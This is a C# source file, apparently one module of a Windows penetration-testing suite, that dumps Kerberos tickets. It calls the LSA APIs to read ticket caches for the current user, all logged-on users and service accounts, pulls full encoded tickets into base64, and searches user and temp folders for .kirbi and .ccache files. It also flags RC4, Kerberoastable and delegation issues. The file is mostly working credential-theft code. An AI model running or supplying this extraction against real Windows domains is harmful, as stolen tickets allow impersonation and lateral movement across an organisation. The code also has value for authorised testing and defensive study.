using System;
using System.Collections.Generic;
using System.Linq;
using System.Threading.Tasks;
using System.Runtime.InteropServices;
using System.Text;
using System.IO;
using System.ComponentModel;
using EliteWindowsPentestSuite.Core;
using EliteWindowsPentestSuite.Models.Results;
using Microsoft.Extensions.Logging;

namespace EliteWindowsPentestSuite.Modules.CredentialAccess
{
    public class KerberosTickets
    {
        private readonly ILogger _logger;
        private readonly PrivilegeManager _privilegeManager;
        private readonly ProcessManager _processManager;

        private const uint KERB_RETRIEVE_TICKET_DEFAULT = 0x0;
        private const uint KERB_RETRIEVE_TICKET_DONT_USE_CACHE = 0x1;
        private const uint KERB_RETRIEVE_TICKET_USE_CACHE_ONLY = 0x2;
        private const uint KERB_RETRIEVE_TICKET_USE_CREDHANDLE = 0x4;
        private const uint KERB_RETRIEVE_TICKET_AS_KERB_CRED = 0x8;
        private const uint KERB_RETRIEVE_TICKET_WITH_SEC_CRED = 0x10;
        private const uint KERB_RETRIEVE_TICKET_CACHE_TICKET = 0x20;
        private const uint KERB_RETRIEVE_TICKET_MAX_LIFETIME = 0x40;

        public KerberosTickets(ILogger logger, PrivilegeManager privilegeManager, ProcessManager processManager)
        {
            _logger = logger ?? throw new ArgumentNullException(nameof(logger));
            _privilegeManager = privilegeManager ?? throw new ArgumentNullException(nameof(privilegeManager));
            _processManager = processManager ?? throw new ArgumentNullException(nameof(processManager));
        }

        public async Task<KerberosTicketsResult> ExtractAsync()
        {
            var result = new KerberosTicketsResult
            {
                StartTime = DateTime.UtcNow,
                ExecutionId = Guid.NewGuid().ToString()
            };

            try
            {
                _logger.LogInformation($"Starting Kerberos tickets extraction {result.ExecutionId}");

                await ValidateEnvironmentAsync(result);
                if (!result.CanProceed) return result;

                await ExtractCurrentUserTicketsAsync(result);
                await ExtractAllUserTicketsAsync(result);
                await ExtractServiceTicketsAsync(result);
                await ExtractDelegationTicketsAsync(result);
                await ExtractCachedTicketsAsync(result);
                await AnalyzeTicketVulnerabilitiesAsync(result);

                result.TotalTicketsFound = result.TGTs.Count + result.TGSs.Count + result.ServiceTickets.Count + result.DelegationTickets.Count;
                result.IsSuccessful = result.TotalTicketsFound > 0;
                result.CompletionTime = DateTime.UtcNow;
                result.Duration = result.CompletionTime - result.StartTime;

                _logger.LogInformation($"Kerberos extraction {result.ExecutionId} completed: {result.TotalTicketsFound} tickets");
            }
            catch (Exception ex)
            {
                result.ErrorMessage = ex.Message;
                result.Exception = ex;
                _logger.LogError(ex, $"Kerberos tickets extraction {result.ExecutionId} failed");
            }

            return result;
        }

        private async Task ValidateEnvironmentAsync(KerberosTicketsResult result)
        {
            result.IsDomainJoined = await IsDomainJoinedAsync();
            result.IsElevated = _privilegeManager.IsProcessElevated();
            result.HasTcbPrivilege = await _privilegeManager.EnablePrivilegeAsync("SeTcbPrivilege");
            result.HasDebugPrivilege = await _privilegeManager.EnablePrivilegeAsync("SeDebugPrivilege");

            if (result.IsDomainJoined)
            {
                result.DomainName = Environment.UserDomainName;
                result.CurrentUser = Environment.UserName;
                result.MachineName = Environment.MachineName;
            }

            result.CanProceed = result.IsDomainJoined || await HasCachedTicketsAsync();

            if (!result.CanProceed)
            {
                result.ErrorMessage = "No domain environment or cached tickets found";
            }
        }

        private async Task<bool> IsDomainJoinedAsync()
        {
            return await Task.Run(() =>
            {
                try
                {
                    var domain = Environment.UserDomainName;
                    var machine = Environment.MachineName;
                    return !string.Equals(domain, machine, StringComparison.OrdinalIgnoreCase);
                }
                catch
                {
                    return false;
                }
            });
        }

        private async Task<bool> HasCachedTicketsAsync()
        {
            return await Task.Run(() =>
            {
                try
                {
                    var ticketCache = GetCurrentUserTicketCache();
                    return ticketCache.Tickets.Count > 0;
                }
                catch
                {
                    return false;
                }
            });
        }

        private async Task ExtractCurrentUserTicketsAsync(KerberosTicketsResult result)
        {
            try
            {
                var ticketCache = await GetCurrentUserTicketCacheAsync();
                result.CurrentUserTicketCache = ticketCache;

                foreach (var ticket in ticketCache.Tickets)
                {
                    if (ticket.ServerName.StartsWith("krbtgt/"))
                    {
                        result.TGTs.Add(ConvertToTGT(ticket));
                    }
                    else
                    {
                        result.TGSs.Add(ConvertToTGS(ticket));
                    }
                }

                result.CurrentUserTicketsFound = ticketCache.Tickets.Count;
                _logger.LogInformation($"Found {ticketCache.Tickets.Count} tickets for current user");
            }
            catch (Exception ex)
            {
                _logger.LogError(ex, "Error extracting current user tickets");
                result.ProcessingErrors.Add($"Current user tickets: {ex.Message}");
            }
        }

        private async Task ExtractAllUserTicketsAsync(KerberosTicketsResult result)
        {
            if (!result.IsElevated) return;

            try
            {
                var userSessions = await _processManager.GetLoggedOnUsersAsync();
                result.TotalUsersScanned = userSessions.Count;

                foreach (var session in userSessions)
                {
                    try
                    {
                        var userTickets = await ExtractUserTicketsAsync(session.Username, session.SessionId);
                        result.UserTicketCaches[session.Username] = userTickets;

                        foreach (var ticket in userTickets.Tickets)
                        {
                            if (ticket.ServerName.StartsWith("krbtgt/"))
                            {
                                result.TGTs.Add(ConvertToTGT(ticket));
                            }
                            else
                            {
                                result.TGSs.Add(ConvertToTGS(ticket));
                            }
                        }
                    }
                    catch (Exception ex)
                    {
                        _logger.LogError(ex, $"Error extracting tickets for user: {session.Username}");
                        result.ProcessingErrors.Add($"User {session.Username}: {ex.Message}");
                    }
                }

                result.AllUserTicketsFound = result.UserTicketCaches.Values.Sum(cache => cache.Tickets.Count);
                _logger.LogInformation($"Found {result.AllUserTicketsFound} tickets across {userSessions.Count} users");
            }
            catch (Exception ex)
            {
                _logger.LogError(ex, "Error extracting all user tickets");
                result.ProcessingErrors.Add($"All user tickets: {ex.Message}");
            }
        }

        private async Task ExtractServiceTicketsAsync(KerberosTicketsResult result)
        {
            try
            {
                var serviceTickets = await ExtractServiceAccountTicketsAsync();
                result.ServiceTickets.AddRange(serviceTickets);
                result.ServiceTicketsFound = serviceTickets.Count;

                _logger.LogInformation($"Found {serviceTickets.Count} service tickets");
            }
            catch (Exception ex)
            {
                _logger.LogError(ex, "Error extracting service tickets");
                result.ProcessingErrors.Add($"Service tickets: {ex.Message}");
            }
        }

        private async Task ExtractDelegationTicketsAsync(KerberosTicketsResult result)
        {
            try
            {
                var delegationTickets = await ExtractConstrainedDelegationTicketsAsync();
                result.DelegationTickets.AddRange(delegationTickets);
                result.DelegationTicketsFound = delegationTickets.Count;

                _logger.LogInformation($"Found {delegationTickets.Count} delegation tickets");
            }
            catch (Exception ex)
            {
                _logger.LogError(ex, "Error extracting delegation tickets");
                result.ProcessingErrors.Add($"Delegation tickets: {ex.Message}");
            }
        }

        private async Task ExtractCachedTicketsAsync(KerberosTicketsResult result)
        {
            try
            {
                var cachedTickets = await ExtractFileSystemCachedTicketsAsync();
                result.CachedTickets.AddRange(cachedTickets);
                result.CachedTicketsFound = cachedTickets.Count;

                _logger.LogInformation($"Found {cachedTickets.Count} cached tickets");
            }
            catch (Exception ex)
            {
                _logger.LogError(ex, "Error extracting cached tickets");
                result.ProcessingErrors.Add($"Cached tickets: {ex.Message}");
            }
        }

        private async Task AnalyzeTicketVulnerabilitiesAsync(KerberosTicketsResult result)
        {
            try
            {
                var vulnerabilities = new List<KerberosVulnerability>();

                await AnalyzeTGTVulnerabilitiesAsync(result.TGTs, vulnerabilities);
                await AnalyzeTGSVulnerabilitiesAsync(result.TGSs, vulnerabilities);
                await AnalyzeServiceTicketVulnerabilitiesAsync(result.ServiceTickets, vulnerabilities);
                await AnalyzeDelegationVulnerabilitiesAsync(result.DelegationTickets, vulnerabilities);

                result.Vulnerabilities.AddRange(vulnerabilities);
                result.VulnerabilitiesFound = vulnerabilities.Count;

                _logger.LogInformation($"Identified {vulnerabilities.Count} Kerberos vulnerabilities");
            }
            catch (Exception ex)
            {
                _logger.LogError(ex, "Error analyzing ticket vulnerabilities");
                result.ProcessingErrors.Add($"Vulnerability analysis: {ex.Message}");
            }
        }

        private async Task<TicketCache> GetCurrentUserTicketCacheAsync()
        {
            return await Task.Run(() => GetCurrentUserTicketCache());
        }

        private TicketCache GetCurrentUserTicketCache()
        {
            var cache = new TicketCache
            {
                Username = Environment.UserName,
                Domain = Environment.UserDomainName,
                SessionId = NativeMethods.GetCurrentSessionId()
            };

            try
            {
                var tickets = EnumerateTicketsForCurrentUser();
                cache.Tickets.AddRange(tickets);
            }
            catch (Exception ex)
            {
                _logger.LogError(ex, "Error enumerating current user tickets");
            }

            return cache;
        }

        private async Task<TicketCache> ExtractUserTicketsAsync(string username, uint sessionId)
        {
            return await Task.Run(() =>
            {
                var cache = new TicketCache
                {
                    Username = username,
                    SessionId = sessionId
                };

                try
                {
                    var tickets = EnumerateTicketsForUser(username, sessionId);
                    cache.Tickets.AddRange(tickets);
                }
                catch (Exception ex)
                {
                    _logger.LogError(ex, $"Error enumerating tickets for user: {username}");
                }

                return cache;
            });
        }

        private List<KerberosTicket> EnumerateTicketsForCurrentUser()
        {
            var tickets = new List<KerberosTicket>();

            try
            {
                var lsaHandle = IntPtr.Zero;
                var authPackage = 0u;

                if (NativeMethods.LsaConnectUntrusted(out lsaHandle) == 0)
                {
                    var packageName = new NativeMethods.LSA_STRING("Kerberos");
                    if (NativeMethods.LsaLookupAuthenticationPackage(lsaHandle, ref packageName, out authPackage) == 0)
                    {
                        tickets = RetrieveTicketsFromLSA(lsaHandle, authPackage);
                    }
                    NativeMethods.LsaDeregisterLogonProcess(lsaHandle);
                }
            }
            catch (Exception ex)
            {
                _logger.LogError(ex, "Error enumerating current user tickets");
            }

            return tickets;
        }

        private List<KerberosTicket> EnumerateTicketsForUser(string username, uint sessionId)
        {
            var tickets = new List<KerberosTicket>();

            try
            {
                var lsaHandle = IntPtr.Zero;
                var authPackage = 0u;

                if (NativeMethods.LsaConnectUntrusted(out lsaHandle) == 0)
                {
                    var packageName = new NativeMethods.LSA_STRING("Kerberos");
                    if (NativeMethods.LsaLookupAuthenticationPackage(lsaHandle, ref packageName, out authPackage) == 0)
                    {
                        tickets = RetrieveTicketsFromLSAForSession(lsaHandle, authPackage, sessionId);
                    }
                    NativeMethods.LsaDeregisterLogonProcess(lsaHandle);
                }
            }
            catch (Exception ex)
            {
                _logger.LogError(ex, $"Error enumerating tickets for user {username}");
            }

            return tickets;
        }

        private List<KerberosTicket> RetrieveTicketsFromLSA(IntPtr lsaHandle, uint authPackage)
        {
            var tickets = new List<KerberosTicket>();

            try
            {
                var cacheRequest = new NativeMethods.KERB_QUERY_TKT_CACHE_REQUEST
                {
                    MessageType = NativeMethods.KERB_PROTOCOL_MESSAGE_TYPE.KerbQueryTicketCacheMessage,
                    LogonId = new NativeMethods.LUID { LowPart = 0, HighPart = 0 }
                };

                var requestSize = Marshal.SizeOf(cacheRequest);
                var requestPtr = Marshal.AllocHGlobal(requestSize);
                Marshal.StructureToPtr(cacheRequest, requestPtr, false);

                var responsePtr = IntPtr.Zero;
                var responseSize = 0u;
                var subStatus = 0;

                var status = NativeMethods.LsaCallAuthenticationPackage(
                    lsaHandle,
                    authPackage,
                    requestPtr,
                    (uint)requestSize,
                    out responsePtr,
                    out responseSize,
                    out subStatus
                );

                if (status == 0 && responsePtr != IntPtr.Zero)
                {
                    tickets = ParseTicketCacheResponse(responsePtr);
                    NativeMethods.LsaFreeReturnBuffer(responsePtr);
                }

                Marshal.FreeHGlobal(requestPtr);
            }
            catch (Exception ex)
            {
                _logger.LogError(ex, "Error retrieving tickets from LSA");
            }

            return tickets;
        }

        private List<KerberosTicket> RetrieveTicketsFromLSAForSession(IntPtr lsaHandle, uint authPackage, uint sessionId)
        {
            var tickets = new List<KerberosTicket>();

            try
            {
                var cacheRequest = new NativeMethods.KERB_QUERY_TKT_CACHE_REQUEST
                {
                    MessageType = NativeMethods.KERB_PROTOCOL_MESSAGE_TYPE.KerbQueryTicketCacheMessage,
                    LogonId = new NativeMethods.LUID { LowPart = sessionId, HighPart = 0 }
                };

                var requestSize = Marshal.SizeOf(cacheRequest);
                var requestPtr = Marshal.AllocHGlobal(requestSize);
                Marshal.StructureToPtr(cacheRequest, requestPtr, false);

                var responsePtr = IntPtr.Zero;
                var responseSize = 0u;
                var subStatus = 0;

                var status = NativeMethods.LsaCallAuthenticationPackage(
                    lsaHandle,
                    authPackage,
                    requestPtr,
                    (uint)requestSize,
                    out responsePtr,
                    out responseSize,
                    out subStatus
                );

                if (status == 0 && responsePtr != IntPtr.Zero)
                {
                    tickets = ParseTicketCacheResponse(responsePtr);
                    NativeMethods.LsaFreeReturnBuffer(responsePtr);
                }

                Marshal.FreeHGlobal(requestPtr);
            }
            catch (Exception ex)
            {
                _logger.LogError(ex, $"Error retrieving tickets from LSA for session {sessionId}");
            }

            return tickets;
        }

        private List<KerberosTicket> ParseTicketCacheResponse(IntPtr responsePtr)
        {
            var tickets = new List<KerberosTicket>();

            try
            {
                var response = Marshal.PtrToStructure<NativeMethods.KERB_QUERY_TKT_CACHE_RESPONSE>(responsePtr);
                var currentPtr = IntPtr.Add(responsePtr, Marshal.SizeOf<NativeMethods.KERB_QUERY_TKT_CACHE_RESPONSE>());

                for (int i = 0; i < response.CountOfTickets; i++)
                {
                    var ticketInfo = Marshal.PtrToStructure<NativeMethods.KERB_TICKET_CACHE_INFO>(currentPtr);

                    var ticket = new KerberosTicket
                    {
                        ServerName = Marshal.PtrToStringUni(ticketInfo.ServerName.Buffer, ticketInfo.ServerName.Length / 2),
                        RealmName = Marshal.PtrToStringUni(ticketInfo.RealmName.Buffer, ticketInfo.RealmName.Length / 2),
                        StartTime = DateTime.FromFileTime(ticketInfo.StartTime),
                        EndTime = DateTime.FromFileTime(ticketInfo.EndTime),
                        RenewTime = DateTime.FromFileTime(ticketInfo.RenewTime),
                        EncryptionType = (EncryptionType)ticketInfo.EncryptionType,
                        TicketFlags = (TicketFlags)ticketInfo.TicketFlags
                    };

                    var fullTicket = RetrieveFullTicket(ticket.ServerName, ticket.RealmName);
                    if (fullTicket != null)
                    {
                        ticket.TicketData = fullTicket;
                        ticket.Base64Ticket = Convert.ToBase64String(fullTicket);
                    }

                    tickets.Add(ticket);
                    currentPtr = IntPtr.Add(currentPtr, Marshal.SizeOf<NativeMethods.KERB_TICKET_CACHE_INFO>());
                }
            }
            catch (Exception ex)
            {
                _logger.LogError(ex, "Error parsing ticket cache response");
            }

            return tickets;
        }

        private byte[] RetrieveFullTicket(string serverName, string realmName)
        {
            try
            {
                var lsaHandle = IntPtr.Zero;
                var authPackage = 0u;

                if (NativeMethods.LsaConnectUntrusted(out lsaHandle) == 0)
                {
                    var packageName = new NativeMethods.LSA_STRING("Kerberos");
                    if (NativeMethods.LsaLookupAuthenticationPackage(lsaHandle, ref packageName, out authPackage) == 0)
                    {
                        var ticketData = RetrieveSpecificTicket(lsaHandle, authPackage, serverName, realmName);
                        NativeMethods.LsaDeregisterLogonProcess(lsaHandle);
                        return ticketData;
                    }
                }
            }
            catch (Exception ex)
            {
                _logger.LogError(ex, $"Error retrieving full ticket for {serverName}@{realmName}");
            }

            return null;
        }

        private byte[] RetrieveSpecificTicket(IntPtr lsaHandle, uint authPackage, string serverName, string realmName)
        {
            try
            {
                var serverNameUnicode = new NativeMethods.LSA_UNICODE_STRING(serverName);
                var realmNameUnicode = new NativeMethods.LSA_UNICODE_STRING(realmName);

                var retrieveRequest = new NativeMethods.KERB_RETRIEVE_TKT_REQUEST
                {
                    MessageType = NativeMethods.KERB_PROTOCOL_MESSAGE_TYPE.KerbRetrieveTicketMessage,
                    LogonId = new NativeMethods.LUID { LowPart = 0, HighPart = 0 },
                    TargetName = serverNameUnicode,
                    TicketFlags = KERB_RETRIEVE_TICKET_DEFAULT,
                    CacheOptions = KERB_RETRIEVE_TICKET_USE_CACHE_ONLY,
                    EncryptionType = 0
                };

                var requestSize = Marshal.SizeOf(retrieveRequest);
                var requestPtr = Marshal.AllocHGlobal(requestSize);
                Marshal.StructureToPtr(retrieveRequest, requestPtr, false);

                var responsePtr = IntPtr.Zero;
                var responseSize = 0u;
                var subStatus = 0;

                var status = NativeMethods.LsaCallAuthenticationPackage(
                    lsaHandle,
                    authPackage,
                    requestPtr,
                    (uint)requestSize,
                    out responsePtr,
                    out responseSize,
                    out subStatus
                );

                if (status == 0 && responsePtr != IntPtr.Zero)
                {
                    var response = Marshal.PtrToStructure<NativeMethods.KERB_RETRIEVE_TKT_RESPONSE>(responsePtr);
                    var ticketData = new byte[response.Ticket.EncodedTicketSize];
                    Marshal.Copy(response.Ticket.EncodedTicket, ticketData, 0, (int)response.Ticket.EncodedTicketSize);

                    NativeMethods.LsaFreeReturnBuffer(responsePtr);
                    Marshal.FreeHGlobal(requestPtr);

                    return ticketData;
                }

                Marshal.FreeHGlobal(requestPtr);
            }
            catch (Exception ex)
            {
                _logger.LogError(ex, "Error retrieving specific ticket");
            }

            return null;
        }

        private async Task<List<ServiceTicket>> ExtractServiceAccountTicketsAsync()
        {
            return await Task.Run(() =>
            {
                var serviceTickets = new List<ServiceTicket>();

                try
                {
                    var services = _processManager.GetRunningServices();

                    foreach (var service in services.Where(s => !string.IsNullOrEmpty(s.ServiceAccount) &&
                                                               !s.ServiceAccount.StartsWith("NT ")))
                    {
                        try
                        {
                            var tickets = GetTicketsForServiceAccount(service.ServiceAccount);
                            foreach (var ticket in tickets)
                            {
                                serviceTickets.Add(new ServiceTicket
                                {
                                    ServiceName = service.ServiceName,
                                    ServiceAccount = service.ServiceAccount,
                                    Ticket = ticket,
                                    TicketType = ticket.ServerName.StartsWith("krbtgt/") ? "TGT" : "TGS"
                                });
                            }
                        }
                        catch (Exception ex)
                        {
                            _logger.LogError(ex, $"Error extracting tickets for service: {service.ServiceName}");
                        }
                    }
                }
                catch (Exception ex)
                {
                    _logger.LogError(ex, "Error extracting service account tickets");
                }

                return serviceTickets;
            });
        }

        private List<KerberosTicket> GetTicketsForServiceAccount(string serviceAccount)
        {
            var tickets = new List<KerberosTicket>();

            try
            {
                var sessions = _processManager.GetLoggedOnUsers();
                var targetSession = sessions.FirstOrDefault(s =>
                    string.Equals(s.Username, serviceAccount, StringComparison.OrdinalIgnoreCase));

                if (targetSession != null)
                {
                    tickets = EnumerateTicketsForUser(serviceAccount, targetSession.SessionId);
                }
            }
            catch (Exception ex)
            {
                _logger.LogError(ex, $"Error getting tickets for service account: {serviceAccount}");
            }

            return tickets;
        }

        private async Task<List<DelegationTicket>> ExtractConstrainedDelegationTicketsAsync()
        {
            return await Task.Run(() =>
            {
                var delegationTickets = new List<DelegationTicket>();

                try
                {
                    var currentTickets = GetCurrentUserTicketCache().Tickets;

                    foreach (var ticket in currentTickets.Where(t => HasDelegationFlag(t.TicketFlags)))
                    {
                        delegationTickets.Add(new DelegationTicket
                        {
                            Ticket = ticket,
                            DelegationType = GetDelegationType(ticket.TicketFlags),
                            CanDelegate = HasForwardableFlag(ticket.TicketFlags),
                            TargetService = ticket.ServerName,
                            DelegatedService = ExtractDelegatedService(ticket)
                        });
                    }
                }
                catch (Exception ex)
                {
                    _logger.LogError(ex, "Error extracting constrained delegation tickets");
                }

                return delegationTickets;
            });
        }

        private async Task<List<CachedTicket>> ExtractFileSystemCachedTicketsAsync()
        {
            return await Task.Run(() =>
            {
                var cachedTickets = new List<CachedTicket>();

                try
                {
                    var tempPath = Path.GetTempPath();
                    var userProfile = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile);

                    var searchPaths = new[]
                    {
                        tempPath,
                        userProfile,
                        @"C:\Users",
                        @"C:\Windows\Temp"
                    };

                    foreach (var searchPath in searchPaths)
                    {
                        try
                        {
                            if (!Directory.Exists(searchPath)) continue;

                            var krbFiles = Directory.GetFiles(searchPath, "krb*", SearchOption.AllDirectories)
                                .Concat(Directory.GetFiles(searchPath, "*.kirbi", SearchOption.AllDirectories))
                                .Concat(Directory.GetFiles(searchPath, "*.ccache", SearchOption.AllDirectories));

                            foreach (var file in krbFiles)
                            {
                                try
                                {
                                    var cachedTicket = ProcessCachedTicketFile(file);
                                    if (cachedTicket != null)
                                    {
                                        cachedTickets.Add(cachedTicket);
                                    }
                                }
                                catch (Exception ex)
                                {
                                    _logger.LogError(ex, $"Error processing cached ticket file: {file}");
                                }
                            }
                        }
                        catch (Exception ex)
                        {
                            _logger.LogError(ex, $"Error searching path: {searchPath}");
                        }
                    }
                }
                catch (Exception ex)
                {
                    _logger.LogError(ex, "Error extracting filesystem cached tickets");
                }

                return cachedTickets;
            });
        }

        private CachedTicket ProcessCachedTicketFile(string filePath)
        {
            try
            {
                var fileInfo = new FileInfo(filePath);
                if (fileInfo.Length == 0 || fileInfo.Length > 10 * 1024 * 1024) return null;

                var data = File.ReadAllBytes(filePath);
                var extension = Path.GetExtension(filePath).ToLower();

                var cachedTicket = new CachedTicket
                {
                    FilePath = filePath,
                    FileSize = fileInfo.Length,
                    CreationTime = fileInfo.CreationTime,
                    LastWriteTime = fileInfo.LastWriteTime,
                    TicketData = data,
                    Base64Ticket = Convert.ToBase64String(data)
                };

                if (extension == ".kirbi")
                {
                    cachedTicket.TicketFormat = "KIRBI";
                    cachedTicket.ParsedTicket = ParseKirbiTicket(data);
                }
                else if (extension == ".ccache")
                {
                    cachedTicket.TicketFormat = "CCACHE";
                    cachedTicket.ParsedTicket = ParseCcacheTicket(data);
                }
                else
                {
                    cachedTicket.TicketFormat = "UNKNOWN";
                    cachedTicket.ParsedTicket = AttemptTicketParsing(data);
                }

                return cachedTicket;
            }
            catch (Exception ex)
            {
                _logger.LogError(ex, $"Error processing cached ticket file: {filePath}");
                return null;
            }
        }

        private KerberosTicket ParseKirbiTicket(byte[] data)
        {
            try
            {
                return new KerberosTicket
                {
                    TicketData = data,
                    Base64Ticket = Convert.ToBase64String(data)
                };
            }
            catch
            {
                return null;
            }
        }

        private KerberosTicket ParseCcacheTicket(byte[] data)
        {
            try
            {
                return new KerberosTicket
                {
                    TicketData = data,
                    Base64Ticket = Convert.ToBase64String(data)
                };
            }
            catch
            {
                return null;
            }
        }

        private KerberosTicket AttemptTicketParsing(byte[] data)
        {
            try
            {
                if (data.Length < 10) return null;

                return new KerberosTicket
                {
                    TicketData = data,
                    Base64Ticket = Convert.ToBase64String(data)
                };
            }
            catch
            {
                return null;
            }
        }

        private async Task AnalyzeTGTVulnerabilitiesAsync(List<TGT> tgts, List<KerberosVulnerability> vulnerabilities)
        {
            await Task.Run(() =>
            {
                foreach (var tgt in tgts)
                {
                    if (tgt.EncryptionType == EncryptionType.RC4_HMAC_MD5)
                    {
                        vulnerabilities.Add(new KerberosVulnerability
                        {
                            Type = VulnerabilityType.WeakEncryption,
                            Severity = "Medium",
                            Description = "TGT using weak RC4 encryption",
                            TicketType = "TGT",
                            Principal = tgt.ClientName,
                            Recommendation = "Upgrade to AES encryption"
                        });
                    }

                    if (tgt.EndTime < DateTime.Now.AddDays(1) && tgt.RenewTime > DateTime.Now.AddDays(7))
                    {
                        vulnerabilities.Add(new KerberosVulnerability
                        {
                            Type = VulnerabilityType.LongLivedTicket,
                            Severity = "Low",
                            Description = "TGT with extended renewal period",
                            TicketType = "TGT",
                            Principal = tgt.ClientName,
                            Recommendation = "Review ticket lifetime policies"
                        });
                    }
                }
            });
        }

        private async Task AnalyzeTGSVulnerabilitiesAsync(List<TGS> tgss, List<KerberosVulnerability> vulnerabilities)
        {
            await Task.Run(() =>
            {
                foreach (var tgs in tgss)
                {
                    if (tgs.EncryptionType == EncryptionType.RC4_HMAC_MD5)
                    {
                        vulnerabilities.Add(new KerberosVulnerability
                        {
                            Type = VulnerabilityType.WeakEncryption,
                            Severity = "Medium",
                            Description = "TGS using weak RC4 encryption",
                            TicketType = "TGS",
                            Principal = tgs.ServiceName,
                            Recommendation = "Configure service to use AES encryption"
                        });
                    }

                    if (IsKerberoastableService(tgs.ServiceName))
                    {
                        vulnerabilities.Add(new KerberosVulnerability
                        {
                            Type = VulnerabilityType.Kerberoasting,
                            Severity = "High",
                            Description = "Service ticket vulnerable to Kerberoasting attack",
                            TicketType = "TGS",
                            Principal = tgs.ServiceName,
                            Recommendation = "Use managed service accounts or strong passwords"
                        });
                    }
                }
            });
        }

        private async Task AnalyzeServiceTicketVulnerabilitiesAsync(List<ServiceTicket> serviceTickets, List<KerberosVulnerability> vulnerabilities)
        {
            await Task.Run(() =>
            {
                foreach (var serviceTicket in serviceTickets)
                {
                    if (serviceTicket.ServiceAccount.Contains("admin", StringComparison.OrdinalIgnoreCase))
                    {
                        vulnerabilities.Add(new KerberosVulnerability
                        {
                            Type = VulnerabilityType.PrivilegedService,
                            Severity = "High",
                            Description = "Service running with privileged account",
                            TicketType = "Service",
                            Principal = serviceTicket.ServiceAccount,
                            Recommendation = "Use least privilege service accounts"
                        });
                    }
                }
            });
        }

        private async Task AnalyzeDelegationVulnerabilitiesAsync(List<DelegationTicket> delegationTickets, List<KerberosVulnerability> vulnerabilities)
        {
            await Task.Run(() =>
            {
                foreach (var delegationTicket in delegationTickets)
                {
                    if (delegationTicket.DelegationType == "Unconstrained")
                    {
                        vulnerabilities.Add(new KerberosVulnerability
                        {
                            Type = VulnerabilityType.UnconstrainedDelegation,
                            Severity = "Critical",
                            Description = "Ticket with unconstrained delegation privileges",
                            TicketType = "Delegation",
                            Principal = delegationTicket.TargetService,
                            Recommendation = "Configure constrained delegation instead"
                        });
                    }
                }
            });
        }

        private TGT ConvertToTGT(KerberosTicket ticket)
        {
            return new TGT
            {
                ClientName = ExtractClientName(ticket),
                ServerName = ticket.ServerName,
                RealmName = ticket.RealmName,
                StartTime = ticket.StartTime,
                EndTime = ticket.EndTime,
                RenewTime = ticket.RenewTime,
                EncryptionType = ticket.EncryptionType,
                TicketFlags = ticket.TicketFlags,
                TicketData = ticket.TicketData,
                Base64Ticket = ticket.Base64Ticket
            };
        }

        private TGS ConvertToTGS(KerberosTicket ticket)
        {
            return new TGS
            {
                ClientName = ExtractClientName(ticket),
                ServiceName = ticket.ServerName,
                RealmName = ticket.RealmName,
                StartTime = ticket.StartTime,
                EndTime = ticket.EndTime,
                RenewTime = ticket.RenewTime,
                EncryptionType = ticket.EncryptionType,
                TicketFlags = ticket.TicketFlags,
                TicketData = ticket.TicketData,
                Base64Ticket = ticket.Base64Ticket
            };
        }

        private string ExtractClientName(KerberosTicket ticket)
        {
            try
            {
                return Environment.UserName;
            }
            catch
            {
                return "Unknown";
            }
        }

        private bool HasDelegationFlag(TicketFlags flags)
        {
            return (flags & (TicketFlags.Forwardable | TicketFlags.Forwarded | TicketFlags.Proxiable | TicketFlags.Proxy)) != 0;
        }

        private bool HasForwardableFlag(TicketFlags flags)
        {
            return (flags & TicketFlags.Forwardable) != 0;
        }

        private string GetDelegationType(TicketFlags flags)
        {
            if ((flags & TicketFlags.OkAsDelegate) != 0)
                return "Unconstrained";
            else if ((flags & TicketFlags.Forwardable) != 0)
                return "Constrained";
            else
                return "None";
        }

        private string ExtractDelegatedService(KerberosTicket ticket)
        {
            return ticket.ServerName;
        }

        private bool IsKerberoastableService(string serviceName)
        {
            var kerberoastableServices = new[]
            {
                "HTTP/", "MSSQLSvc/", "FTP/", "IMAP/", "POP/", "SMTP/",
                "exchangeMDB/", "TERMSRV/", "RestrictedKrbHost/", "HOST/"
            };

            return kerberoastableServices.Any(service => serviceName.StartsWith(service, StringComparison.OrdinalIgnoreCase));
        }
    }

    public class KerberosTicketsResult : BaseResult
    {
        public string ExecutionId { get; set; }
        public DateTime StartTime { get; set; }
        public DateTime CompletionTime { get; set; }
        public TimeSpan Duration { get; set; }

        public bool IsDomainJoined { get; set; }
        public bool IsElevated { get; set; }
        public bool HasTcbPrivilege { get; set; }
        public bool HasDebugPrivilege { get; set; }
        public bool CanProceed { get; set; }

        public string DomainName { get; set; }
        public string CurrentUser { get; set; }
        public string MachineName { get; set; }

        public int TotalTicketsFound { get; set; }
        public int CurrentUserTicketsFound { get; set; }
        public int AllUserTicketsFound { get; set; }
        public int ServiceTicketsFound { get; set; }
        public int DelegationTicketsFound { get; set; }
        public int CachedTicketsFound { get; set; }
        public int VulnerabilitiesFound { get; set; }
        public int TotalUsersScanned { get; set; }

        public TicketCache CurrentUserTicketCache { get; set; } = new TicketCache();
        public Dictionary<string, TicketCache> UserTicketCaches { get; set; } = new Dictionary<string, TicketCache>();

        public List<TGT> TGTs { get; set; } = new List<TGT>();
        public List<TGS> TGSs { get; set; } = new List<TGS>();
        public List<ServiceTicket> ServiceTickets { get; set; } = new List<ServiceTicket>();
        public List<DelegationTicket> DelegationTickets { get; set; } = new List<DelegationTicket>();
        public List<CachedTicket> CachedTickets { get; set; } = new List<CachedTicket>();
        public List<KerberosVulnerability> Vulnerabilities { get; set; } = new List<KerberosVulnerability>();

        public List<string> ProcessingErrors { get; set; } = new List<string>();
        public Exception Exception { get; set; }
    }

    public class TicketCache
    {
        public string Username { get; set; }
        public string Domain { get; set; }
        public uint SessionId { get; set; }
        public List<KerberosTicket> Tickets { get; set; } = new List<KerberosTicket>();
    }

    public class KerberosTicket
    {
        public string ServerName { get; set; }
        public string RealmName { get; set; }
        public DateTime StartTime { get; set; }
        public DateTime EndTime { get; set; }
        public DateTime RenewTime { get; set; }
        public EncryptionType EncryptionType { get; set; }
        public TicketFlags TicketFlags { get; set; }
        public byte[] TicketData { get; set; }
        public string Base64Ticket { get; set; }
    }

    public class TGT : KerberosTicket
    {
        public string ClientName { get; set; }
    }

    public class TGS : KerberosTicket
    {
        public string ClientName { get; set; }
        public string ServiceName { get; set; }
    }

    public class ServiceTicket
    {
        public string ServiceName { get; set; }
        public string ServiceAccount { get; set; }
        public KerberosTicket Ticket { get; set; }
        public string TicketType { get; set; }
    }

    public class DelegationTicket
    {
        public KerberosTicket Ticket { get; set; }
        public string DelegationType { get; set; }
        public bool CanDelegate { get; set; }
        public string TargetService { get; set; }
        public string DelegatedService { get; set; }
    }

